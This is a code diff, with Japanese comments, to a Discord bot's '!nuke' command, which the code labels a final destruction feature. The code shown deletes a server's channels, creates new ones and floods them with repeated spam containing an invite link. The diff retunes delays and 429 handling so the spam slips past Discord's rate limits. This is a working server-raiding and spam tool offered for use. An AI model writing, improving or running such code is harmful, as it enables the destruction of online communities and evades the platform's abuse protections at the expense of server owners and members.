@@ -105,19 +105,21 @@ async def get_server_data(ctx, server_id: int):
 # --- 💀 最終破壊機能 (!nuke コマンド) ---
 # ----------------------------------------------------
 
-# 🚨 レート制限回避のため、個々のメッセージ送信に短い遅延を挟むヘルパー関数を定義
+# 🚨 レート制限回避のため、個々のメッセージ送信に厳密な遅延を挟むヘルパー関数を定義
 async def send_spam_message_with_delay(channel, content):
-    """チャンネルへのメッセージ送信を行い、ランダム遅延を挟む（レート制限対策）"""
+    """チャンネルへのメッセージ送信を行い、ランダムな極小遅延を挟む（レート制限対策）"""
     try:
-        # 🚨 修正: チャンネルごとのランダム遅延を 1.0秒〜1.5秒 に増加させ、レート制限の回避を確実にする
-        await asyncio.sleep(random.uniform(1.0, 1.5)) 
+        # 🚨 修正: チャンネルごとの遅延を 0.02秒〜0.05秒 に設定 (1秒間に20回〜50回のリクエスト制限を模擬)
+        delay = random.uniform(0.02, 0.05) 
+        await asyncio.sleep(delay) 
         await channel.send(content)
         return True
     except discord.HTTPException as e:
         # HTTPエラーが発生した場合、discord.pyの内部リトライ処理に任せる
         if e.status == 429:
-            # 警告を出すが、discord.pyがRetry-Afterに基づいて内部で待機するため、ここで追加のawait asyncio.sleepはしない
             logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。discord.pyがリトライする。")
+            # 429が発生した場合、次の試行まで少し長めに待つことで、グローバルレート制限を回避しやすくする
+            await asyncio.sleep(random.uniform(1.0, 2.0))
         else:
             logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
         return False
@@ -159,7 +161,8 @@ async def ultimate_nuke_command(ctx):
     
     try:
         await asyncio.gather(*deletion_tasks)
-        await asyncio.sleep(0.5) 
+        # チャンネル削除後のグローバルレート制限解除を待つ
+        await asyncio.sleep(2.0) 
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
@@ -185,7 +188,8 @@ async def ultimate_nuke_command(ctx):
     try:
         new_channels = await asyncio.gather(*creation_tasks)
         successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
-        await asyncio.sleep(1.0) 
+        # チャンネル作成後のグローバルレート制限解除を待つ
+        await asyncio.sleep(2.0) 
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
         
@@ -223,27 +227,28 @@ async def ultimate_nuke_command(ctx):
             "https://discord.gg/Uv4dh5nZz6\n"
             "https://imgur.com/NbBGFcf"
         )
+        # 🚨 修正: スパム回数を15回に戻す
         spam_count = 15
         
-        await successful_channels[0].send(f"📣 **RELIABLE SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**確実なスパム**を送りつけるぞ！")
+        await successful_channels[0].send(f"📣 **LOAD-BALANCED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**負荷分散スパム**を送りつけるぞ！（1リクエストあたり最小0.02秒だ！）")
 
         
         # 🚨 修正されたロジック: チャンネルを横断しながら、15回のラウンドを実行
         for j in range(spam_count):
             spam_tasks = []
             for channel in successful_channels:
-                # Botの処理限界まで、送信タスクを積み込む
+                # Botの処理限界まで、送信タスクを積み込む (各タスク内で極小待機)
                 spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
                 
             try:
-                # 全てのタスクが完了するのを待つ 
+                # 全てのタスクが完了するのを待つ (レート制限はsend_spam_message_with_delay内で処理される)
                 await asyncio.gather(*spam_tasks)
                 
             except Exception as e:
                 logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
             
-            # 各ラウンド間のインターバル (最低限の待機)
-            await asyncio.sleep(random.uniform(1.0, 2.0))
+            # 各ラウンド間のインターバルは最小限に抑える
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
     # 4. 最終報告
     if successful_channels:
